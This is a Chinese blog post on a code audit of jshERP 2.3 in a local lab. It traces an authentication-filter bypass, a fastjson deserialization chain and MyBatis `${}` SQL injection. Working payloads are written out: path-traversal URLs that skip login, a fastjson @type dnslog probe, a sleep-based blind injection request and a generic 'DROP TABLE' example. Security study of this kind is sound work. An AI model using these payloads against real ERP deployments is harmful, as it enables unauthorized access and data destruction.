---
title: 华夏ERP 2.3 代码审计
date: 2025-08-20T14:00:00+08:00
tags:
  - "ERP系统审计"
categories:
  - "代码审计"
description: 华夏ERP 2.3 代码审计
showToc: true
draft: false
tocOpen: true
---
项目地址：[https://github.com/jishenghua/jshERP/releases/tag/2.3](https://github.com/jishenghua/jshERP/releases/tag/2.3)

# 环境搭建：
MySQL 5.7.26，IDEA，Maven 3.9.1，JDK 1.8， 

数据库新建jsh_erp数据库，导入sql文件

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png)![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png)IDEA 的 JDK 版本切换为1.8

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png)



Maven构建

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png)

运行 ErpApplication.java 启动程序

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png)![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png)



# 目录分析
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png)

这个项目的结构更像是 MVC 架构（ Mapper/MapperXML； Controller  ），又增加了  Service 层 。

+ Maven Assembly 插件，用于帮助打包； assembly.xml  是打包的配置文件
+ bin 中的文件都是 jshERP 的运行脚本
+ resources/mapper_xml： MyBatis 框架的 SQL 映射配置文件， “数据库操作说明书”  
+ logback-spring.xml：日志文件输出配置
+ java
    - config
        * <font style="color:#080808;background-color:#ffffff;">PluginBeanConfig.java  插件管理器 Bean</font>
        * <font style="color:#080808;background-color:#ffffff;">PluginConfiguration.java  配置插件系统的运行环境和参数  </font>
        * <font style="color:#080808;background-color:#ffffff;"> Swagger2Config.java      用于生成 RESTful API 文档 , 提供文档元信息  </font>
        * <font style="color:#080808;background-color:#ffffff;"> TenantConfig.java  项目数据库访问的</font>统一拦截器和插件配置中心
        *  WebConfig.java 指定前端静态文件存放位置， 在 Spring Boot 内置 Web 服务器中生效  
    - constants     
        *  BusinessConstants  <font style="color:#080808;background-color:#ffffff;">业务字典类</font>
        * <font style="color:#080808;background-color:#ffffff;"> ExceptionConstants    异常与返回码管理类  </font>
    - controller      Web 层接口  
    - datasource      数据源和数据库访问配置  
    - exception    异常处理  
    - filter
        *  LogCostFilter   自定义 Servlet 过滤器， 控制用户访问权限和登录请求处理
    - service     业务逻辑层  
    - utils    工具类  
    - ErpApplication.java    入口类，参考[SpringBoot-注解 @SpringBootApplication 分析](https://www.yuque.com/taohuayuanpang/kfw7zl/cqdlt0kgwyh524ay#vrt3I)

```java
//声明 springboot，组合了@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann
@SpringBootApplication
//MyBatis Mapper 接口扫描路径
@MapperScan("com.jsh.erp.datasource.mappers")
@ServletComponentScan
@EnableScheduling
public class ErpApplication{
    public static void main(String[] args) throws IOException {
        ConfigurableApplicationContext context = SpringApplication.run(ErpApplication.class, args);
        Environment environment = context.getBean(Environment.class);
        System.out.println("启动成功，访问地址：http://" + ComputerInfo.getIpAddr() + ":"
                           + environment.getProperty("server.port") + "，测试用户：jsh，密码：123456");
    }
}
```



# 代码审计
## 1、LogCostFilter.java
```java
package com.jsh.erp.filter;

import org.springframework.util.StringUtils;
import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.annotation.WebInitParam;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@WebFilter(
    filterName = "LogCostFilter",
    //过滤器对所有路径都生效
    urlPatterns = {"/*"},
    initParams = {
        //要忽略的静态资源
        @WebInitParam(name = "ignoredUrl", value = ".css#.js#.jpg#.png#.gif#.ico"),
        //允许未登录访问的路径
        @WebInitParam(name = "filterPath", value = "/user/login#/user/registerUser#/v2/api-docs")
    }
)
public class LogCostFilter implements Filter {

    private static final String FILTER_PATH = "filterPath";
    private static final String IGNORED_PATH = "ignoredUrl";

    private static final List<String> ignoredList = new ArrayList<>();
    private String[] allowUrls;
    private String[] ignoredUrls;

    //将 filterPath 和 ignoredUrl 解析成 allowUrls 和 ignoredList（白名单），用于后续 doFilter 判断
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        String filterPath = filterConfig.getInitParameter(FILTER_PATH);
        if (!StringUtils.isEmpty(filterPath)) {
            allowUrls = filterPath.contains("#") ? filterPath.split("#") : new String[]{filterPath};
        }

        String ignoredPath = filterConfig.getInitParameter(IGNORED_PATH);
        if (!StringUtils.isEmpty(ignoredPath)) {
            ignoredUrls = ignoredPath.contains("#") ? ignoredPath.split("#") : new String[]{ignoredPath};
            for (String ignoredUrl : ignoredUrls) {
                ignoredList.add(ignoredUrl);
            }
        }
    }
    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        HttpServletRequest servletRequest = (HttpServletRequest) request;
        HttpServletResponse servletResponse = (HttpServletResponse) response;
        String requestUrl = servletRequest.getRequestURI();
        //具体，比如：处理若用户未登录，则跳转到登录页
        Object userInfo = servletRequest.getSession().getAttribute("user");
        if(userInfo!=null) { //如果已登录，不阻止
            chain.doFilter(request, response);
            return;
        }
        //未登录时允许访问的页面
        if (requestUrl != null && (requestUrl.contains("/doc.html") ||
                                   requestUrl.contains("/register.html") || requestUrl.contains("/login.html"))) {
            chain.doFilter(request, response);
            return;
        }
        // ignoredList
        if (verify(ignoredList, requestUrl)) {
            chain.doFilter(servletRequest, response);
            return;
        }
        // allowUrls
        if (null != allowUrls && allowUrls.length > 0) {
            for (String url : allowUrls) {
                if (requestUrl.startsWith(url)) {
                    chain.doFilter(request, response);
                    return;
                }
            }
        }
        //if 条件都不满足，重定向到 /login.html
        servletResponse.sendRedirect("/login.html");
    }

    private static String regexPrefix = "^.*";
    private static String regexSuffix = ".*$";

    private static boolean verify(List<String> ignoredList, String url) {
        for (String regex : ignoredList) {
            Pattern pattern = Pattern.compile(regexPrefix + regex + regexSuffix);
            Matcher matcher = pattern.matcher(url);
            if (matcher.matches()) {
                return true;
            }
        }
        return false;
    }
    @Override
    public void destroy() {

    }
}
```

过滤逻辑：

+ 放行：
    - Session 中有 user
    - 访问 `/doc.html` `/register.html` `/login.html`   
    - ignoredList  静态资源
    - allowUrls     /user/login   /user/registerUser    /v2/api-docs
+ 其他全部重定向到 /login.html
+ 缺陷：
    - 虽然有白名单，但路径匹配不完整，如果在 url 中构建如：1.css/../index.html  doc.html/../index.html 等，就会绕过

**漏洞利用：**

payload：

```plain
/doc.html/../home.html
/register.html/../home.html
/login.html/../home.html
/1.css/../home.html
/user/login/../../home.html
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png)

**注意：**

这抓包中有时会抓到这样一行数据： If-Modified-Since: Tue, 05 Jan 2021 22:51:28 GMT  

这是浏览器的本地缓存，如果这个资源自这个时间点之后没有修改，就返回304

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png)

把这个去掉就可以正常注入了

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png)

## 2、pom.xml - **Maven 依赖**
### 2.1 fastjson-1.2.55-反序列化漏洞
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png)

入口点：parseObject

**全局搜索 parseObject **，找一个带有可控变量的点

找到 src/main/java/com/jsh/erp/utils/StringUtil.java 中有利用点

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png)

#### 分析链：
****

```java
public static String getInfo(String search, String key){
    //返回值初始化为空字符串
    String value = "";
    //判断 search 是否为空
    if(search!=null) {
        //将 search 解析为 JSONObject
        JSONObject obj = JSONObject.parseObject(search);
        //从 JSONObject 取一个 key 并转化为 String
        value = obj.getString(key);
        //如果取到空字符串，value = null;
        if(value.equals("")) {
            value = null;
        }
    }
    return value;
}
```

跟进 <font style="color:#080808;background-color:#ffffff;">JSONObject.parseObject</font>

```java
public static JSONObject parseObject(String text) {
//调用了 parse 方法，把 text 解析成一个 Java 对象
Object obj = parse(text);
if (obj instanceof JSONObject) {
    return (JSONObject) obj;
}
```

跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text)</font>

```java
public static Object parse(String text) {
    //调用了另一个 parse
    return parse(text, DEFAULT_PARSER_FEATURE);
}
```

跟进 <font style="color:#080808;background-color:#ffffff;">parse(String text, int features)</font>

```java
public static Object parse(String text, int features) {
    //引入了 ParserConfig.getGlobalInstance() 方法
    return parse(text, ParserConfig.getGlobalInstance(), features);
}
```

跟进 parse(String text, ParserConfig config, int features)

```java
public static Object parse(String text, ParserConfig config, int features) {
        if (text == null) {
            return null;
        }

        DefaultJSONParser parser = new DefaultJSONParser(text, config, features);
        //解析 JSON
        Object value = parser.parse();
        parser.handleResovleTask(value);
        parser.close();
        return value;
    }
```

跟进 <font style="color:#080808;background-color:#ffffff;">DefaultJSONParser</font>

```java
public DefaultJSONParser(final String input, final ParserConfig config, int features){
    //创建 JSONScanner ，传给下一个核心构造器
    this(input, new JSONScanner(input, features), config);
}
```

```java
public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config){
    //lexer：词法分析器。
    this.lexer = lexer;
    //用户输入的 JSON 字符串
    this.input = input;
    this.config = config;
    this.symbolTable = config.symbolTable;

    //获取 JSON 输入的第一个字符，用于判断 JSON 的类型：{ 对象；[ 数组；其他（数字、字符串、布尔等）
    int ch = lexer.getCurrent();
    if (ch == '{') {
        lexer.next();
        ((JSONLexerBase) lexer).token = JSONToken.LBRACE;
    } else if (ch == '[') {
        lexer.next();
        ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;
    } else {
        lexer.nextToken(); // prime the pump
    }
}
```

> **<font style="color:rgb(34, 34, 38);">lexer（词法分析器）与 parser（语法分析器）</font>**
>
> [**https://blog.csdn.net/buguge/article/details/147525215**](https://blog.csdn.net/buguge/article/details/147525215)
>
> **<font style="color:rgb(77, 77, 77);">词法分析器(Lexer)和语法分析器(Parser)</font>**<font style="color:rgb(77, 77, 77);">是两个核心组件，它们协同工作将原始输入(如JSON字符串、代码文件)转换为结构化数据(如对象、抽象语法树)</font>
>

返回一步，Object value = parser.parse();   跟进 parse()

```java
public Object parse() {
    return parse(null);
}
```

```java
public Object parse(Object fieldName) {
final JSONLexer lexer = this.lexer;
switch (lexer.token()) {
    ...
    case LBRACE:
        JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
        return parseObject(object, fieldName);
    ...
```

跟进 parseObject

```java
public final Object parseObject(final Map object, Object fieldName) {
```

在这个类中找我们需要的处理 @type 的部分，搜索  checkAutoType

```java
//JSON.DEFAULT_TYPE_KEY 即 @type
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');

    Class<?> clazz = config.checkAutoType(typeName, null, lexer.getFeatures());
```

跟进 checkAutoType

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
```

来到这个类中，按照之前版本的经验，下一步有个 <font style="color:rgb(51, 51, 51);">TypeUtils.loadClass ，继续搜索</font>

```java
if (autoTypeSupport || expectClassFlag) {
    long hash = h3;
    for (int i = 3; i < className.length(); ++i) {
        hash ^= className.charAt(i);
        hash *= PRIME;
        if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
            if (clazz != null) {
                return clazz;
            }
        }
        if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }
}
```

跟进 TypeUtils.loadClass

```java
public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
    if(className == null || className.length() == 0 || className.length() > 128){
        return null;
    }
```

下一步执行序列化和反序列化

```java
ObjectDeserializer deserializer = config.getDeserializers().get(clazz);
if(deserializer != null){
    String json = JSON.toJSONString(object);
    return (T) JSON.parseObject(json, clazz);
}
```

<font style="color:rgb(51, 51, 51);">在执行反序列化的过程中，调用实例化的类，执行后续命令</font>

<font style="color:rgb(51, 51, 51);"></font>

接下来应该找**调用 StringUtil#getInfo 方法**的地方

看了参考文章找到 <font style="color:rgb(51, 51, 51);">UserComponent</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png)

```java
private List<?> getUserList(Map<String, String> map)throws Exception {
    //接收到前端传的 Map<String,String>，包含 search 
    String search = map.get(Constants.SEARCH);
    String userName = StringUtil.getInfo(search, "userName");
    String loginName = StringUtil.getInfo(search, "loginName");
    String order = QueryUtils.order(map);
    String filter = QueryUtils.filter(map);
    return userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));
}
```

找 getUserList 的调用地方，这时应该找的是控制器里的方法了

> 几个踩坑的地方：
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png)
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png)
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png)
>
> 我们要注意，真正应该调用的是 <font style="color:#080808;background-color:#ffffff;">getUserList(Map<String, String> map)，而上面的都不是正确调用</font>
>

找到真正调用 <font style="color:#080808;background-color:#ffffff;">getUserList(Map<String, String> map) 的地方</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png)

```java
//路径变量 {apiName} 
@GetMapping(value = "/{apiName}/list")
public String getList(@PathVariable("apiName") String apiName,
                      @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,
                      @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,
                      //search 可传入 payload
                      @RequestParam(value = Constants.SEARCH, required = false) String search,
                      HttpServletRequest request)throws Exception {
    //参数全部放入 Map，进行后续处理
    Map<String, String> parameterMap = ParamUtils.requestToMap(request);
    parameterMap.put(Constants.SEARCH, search);
    PageQueryInfo queryInfo = new PageQueryInfo();
    Map<String, Object> objectMap = new HashMap<String, Object>();
```

****

**小结利用链：**

```java
@GetMapping(value = "/{apiName}/list")
public String getList(@PathVariable("apiName") String apiName,
                      @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,
                      @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,
                      @RequestParam(value = Constants.SEARCH, required = false) String search,
                      HttpServletRequest request)throws Exception {
->
private List<?> getUserList(Map<String, String> map)throws Exception {
    String userName = StringUtil.getInfo(search, "userName");
    String loginName = StringUtil.getInfo(search, "loginName");
}
->
public static String getInfo(String search, String key){
->
String userName = StringUtil.getInfo(search, "userName");
String loginName = StringUtil.getInfo(search, "loginName");
->
JSONObject obj = JSONObject.parseObject(search);
->
Object obj = parse(text);
->
turn parse(text, DEFAULT_PARSER_FEATURE);
->
return parse(text, ParserConfig.getGlobalInstance(), features);
->
DefaultJSONParser parser = new DefaultJSONParser(text, config, features);
Object value = parser.parse();
->
public Object parse() {
    return parse(null);
}
->
return parseObject(object, fieldName);
->
public final Object parseObject(final Map object, Object fieldName) {
->
Class<?> clazz = config.checkAutoType(typeName, null, lexer.getFeatures());
->
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
->
clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
->
public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) 
->
ObjectDeserializer deserializer = config.getDeserializers().get(clazz);

```



#### payload
```json
{
  "@type":"java.net.Inet4Address",
  "val":"xxx.dnslog.cn"
}
```

@type：指定 fastjson 要实例化的类， val：这个类的某个字段值  

`Inet4Address` 只能解析 IP/域名，不能触发 LDAP 请求  

```http
GET user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D HTTP/1.1
Host: 172.28.192.1:8123
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png)



#### 断点调试：
调试过程基本和“分析链”中一致，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png)

<font style="color:rgb(34, 34, 38);"></font>

> <font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）
>
> [https://blog.csdn.net/Adminxe/article/details/105918000](https://blog.csdn.net/Adminxe/article/details/105918000)
>

#### 总结：
```java
HTTP GET 请求 ：/user/list?search={"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
->	ResourceController.java
getList(@PathVariable("apiName") String apiName,
                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,
                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,
                        @RequestParam(value = Constants.SEARCH, required = false) String search,
                        HttpServletRequest request)
->	UserComponent.java
getUserList#getInfo(search)
->
JSONObject.parseObject(search)
->
DefaultJSONParser
->
parse 
->
checkAutoType
->
loadClass
->
TypeUtils.loadClass
->
config.getDeserializers().get(clazz)
->
Inet4Address
->
MiscCodec#ObjectDeserializer
->
return InetAddress.getByName(strVal); //将strVal作为主机名,获取其对应的ip，域名在此处被解析
```



### 2.2 log4j （不存在）
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png)

并没有导入 log4j-core 包，单独的 log4j-to-slf4j  是不存在漏洞的

`log4j-to-slf4j` 是一个 **桥接器（bridge）**，它把 Log4j 2 API 的调用转发到 SLF4J，由 SLF4J 来真正打印  



### 2.3 MyBatis **<font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945（不存在）</font>**
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png)



#### 漏洞点分析：
<font style="color:rgb(51, 51, 51);">SerializedCache#deserialize()</font>

```java
@Override
public Object getObject(Object key) {
    //从底层的 delegate（被代理的对象，一般是一个缓存或Map）中取值
    Object object = delegate.getObject(key);
    // 如果取到的值是 null(过期)，直接返回 null；
    // 否则将取到的值强转为 byte[]，再调用 deserialize 方法反序列化，恢复成原来的对象
    //deserialize((byte[]) object) 就是 RCE 的触发点了
    return object == null ? null : deserialize((byte[]) object);
}
```

跟进 delegate.getObject

```java
public interface Cache {
    ...
    Object getObject(Object key);
    ...
}
```

getObject    ctrl+alt+左键 转到声明

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png)

 跟进到 ScheduledCache  

```java
@Override
public Object getObject(Object key) {
    //clearWhenStale() 检查缓存是否“过期”
    return clearWhenStale() ? null : delegate.getObject(key);
}
```

```java
private boolean clearWhenStale() {
    if (System.currentTimeMillis() - lastClear > clearInterval) {
        clear();
        return true;
    }
    return false;
}
```



#### <font style="color:rgb(34, 34, 34);">利用条件</font>
1. <font style="color:rgb(53, 53, 53);">用户启用了二级缓存功能</font>

> <font style="color:rgb(53, 53, 53);">二级缓存其实就是将查询的结果，放入缓存中，下次查询相同的条件时，直接从缓存中获取结果，降低sql服务器的压力</font>
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png)
>

2. <font style="color:rgb(53, 53, 53);">攻击者可以修改缓存的内容，替换为恶意反序列化数据</font>
3. <font style="color:rgb(53, 53, 53);">用户未设置JEP-290过滤，且没有任何防御反序列化攻击的措施</font>

> **JEP-290 是从 Java 9 开始引入的**，在 Java 8 里 **不存在全局或类级序列化过滤器** 的机制  
>


**由于找不到可修改的缓存内容，这部分就作为漏洞学习一遍，本系统不存在此漏洞**



## 接下来的审计按照以下方向进行：
1. SQL 注入
2. ~~文件安全 （在翻找功能点过程中并没有发现有能上传&读取文件的点）~~
3. 身份验证&鉴权 （LogCostFilter.java）
4. 第三方组件&依赖 （已分析）

## 3、Mybatis SQL 注入


Mybatis框架的sql注入关注`${}`：

`${}`用于直接替换SQL语句中的占位符，而`#{}`用于预编译

1. like模糊查询

```sql
xml模板：
SELECT * FROM users WHERE username LIKE '%${name}%'

sql注入：
' OR '1'='1

执行sql:
SELECT * FROM users WHERE username LIKE '%%' OR '1'='1%'
```

2.  动态列名 / 表名  

```sql
xml模板：
SELECT ${column} FROM users WHERE id = #{id}

sql注入：
column = "username, password from users --"

执行sql:
SELECT username, password from users -- FROM users WHERE id = ?
```

3.  Order By  

```sql
xml模板：
SELECT * FROM users ORDER BY ${sortColumn}

sql注入：
sortColumn = "id; DROP TABLE users --"

执行sql:
SELECT * FROM users ORDER BY id; DROP TABLE users -- 
```

4. IN

```sql
xml模板：
SELECT * FROM users WHERE id IN (${ids})

sql注入：
mapper.findByIds("1,2,3 OR 1=1");

执行sql:
SELECT * FROM users WHERE id IN (1,2,3 OR 1=1)
```



### AccoutMapperEx.xml
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png)

接下来考虑Controller/Service 中是否传入了 name 参数

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png)

跟进 <font style="color:#080808;background-color:#ffffff;">select，</font>

<font style="color:#080808;background-color:#ffffff;"> 从请求参数 map 中解析搜索条件  </font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png)

寻找调用 <font style="color:#080808;background-color:#ffffff;">getAccountList() 的位置</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png)

跟进 select

 <font style="color:#080808;background-color:#ffffff;">select(String apiName, Map<String, String> parameterMap) 是</font>整个查询模块的统一入口  

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png)

继续跟进，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png)

接下来去找对应的功能点，可以发现，在“基本资料”中都是查询接口，而现在我们需要的是“结算账户”的查询接口，其他的接口也应该存在sql注入，之后查看。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png)

对“结算账户”的查询点抓包后，正好对应刚才源码中看到的几个参数“<font style="color:#080808;background-color:#ffffff;">name, serialNo, remark</font>”：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png)

对 name 参数进行sql注入：

从结果来看时间盲注成功了

```html
GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&currentPage=1&pageSize=15 HTTP/1.1
Host: 169.254.252.28:8123
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://169.254.252.28:8123/pages/manage/account.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817
Connection: close

GET /account/list?search={"name":"123' or sleep(5)--+","serialNo":"2","remark":"3"}&currentPage=1&pageSize=15 HTTP/1.1

payload：
GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&currentPage=1&pageSize=15 HTTP/1.1
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png)

在Mybatis的日志中， 可以清楚看到 SQL 注入点已经被利用，并且 **时间盲注生效**：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png)


### DepotMapperEx.xml 
通过上述AccoutMapperEx.xml的审计，可以确定该系统中有多个类似的sql注入点，他们的流程都是一致的。

再以DepotMapperEx.xml 为例：

```plain
<select id="selectByConditionDepot" parameterType="com.jsh.erp.datasource.entities.DepotExample" resultMap="ResultMapEx">
  select dep.*,usr.username as principalName
  FROM jsh_depot dep
  left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,'0') not in('1','2')
  where 1=1
  <if test="name != null">
    and dep.name like '%${name}%'
  </if>

->selectByConditionDepot
public interface DepotMapperEx {

    List<DepotEx> selectByConditionDepot(
            @Param("name") String name,
            @Param("type") Integer type,
            @Param("remark") String remark,
            @Param("offset") Integer offset,
            @Param("rows") Integer rows);

->DepotService
public List<DepotEx> select(String name, Integer type, String remark, int offset, int rows)throws Exception {
        List<DepotEx> list=null;
        try{
            list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows);
        }catch(Exception e){
            JshException.readFail(logger, e);
        }
        return list;
    }

->select
@Override
    public List<?> select(Map<String, String> map)throws Exception {
        return getDepotList(map);
    }

    private List<?> getDepotList(Map<String, String> map)throws Exception {
        String search = map.get(Constants.SEARCH);
        String name = StringUtil.getInfo(search, "name");
        Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, "type"));
        String remark = StringUtil.getInfo(search, "remark");
        String order = QueryUtils.order(map);
        return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map));
    }

->select
 /**
     * 查询
     * @param apiName
     * @param parameterMap
     * @return
     */
    public List<?> select(String apiName, Map<String, String> parameterMap)throws Exception {
        if (StringUtil.isNotEmpty(apiName)) {
            return container.getCommonQuery(apiName).select(parameterMap);
        }
        return new ArrayList<Object>();
    }

->select
@GetMapping(value = "/{apiName}/list")
    public String getList(@PathVariable("apiName") String apiName,
                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,
                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,
                        @RequestParam(value = Constants.SEARCH, required = false) String search,
                        HttpServletRequest request)throws Exception {
        Map<String, String> parameterMap = ParamUtils.requestToMap(request);
        parameterMap.put(Constants.SEARCH, search);
        PageQueryInfo queryInfo = new PageQueryInfo();
        Map<String, Object> objectMap = new HashMap<String, Object>();
        if (pageSize != null && pageSize <= 0) {
            pageSize = 10;
        }
        String offset = ParamUtils.getPageOffset(currentPage, pageSize);
        if (StringUtil.isNotEmpty(offset)) {
            parameterMap.put(Constants.OFFSET, offset);
        }
        List<?> list = configResourceManager.select(apiName, parameterMap);
        objectMap.put("page", queryInfo);
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300922116.png)



### 小结：
通过全局搜索到`like '%${name}%'`，定位 `<select id="selectByConditionXxxxx"`，之后便在 `controller` 和 `service` 中找对应的文件名，在其中找到  `selectByConditionXxxxx` (基本上都在service中)，找到之后会发现 `selectByConditionXxxxx` 中所需的几个参数，都是来自 `select` 查询，跟进 `select` ，找到 `getXxxList` 方法解析 `select(Map<String,String> map)` 传入的前端请求参数，跟进 `select`，发现他是统一接口，通过 `apiName` 动态调用不同查询。接下来就在前端找对应的功能点，在”基本资料“里可以看到有查询功能，通过抓包或者对应名称来确定需要的接口，例如：`GET /account/list?search={"name":"1","serialNo":"2","remark":"3"}&currentPage=1&pageSize=15 HTTP/1.1`，`name、serialNo、remark` 都是对应的 `AccoutMapperEx` 的参数，那么就在 `name` 参数注入。


同样的漏洞有：

+ AccoutMapperEx.xml	
+ DepotMapperEx.xml 
+ LogMapperEx.xml （功能点在“系统管理”-“日志管理”）
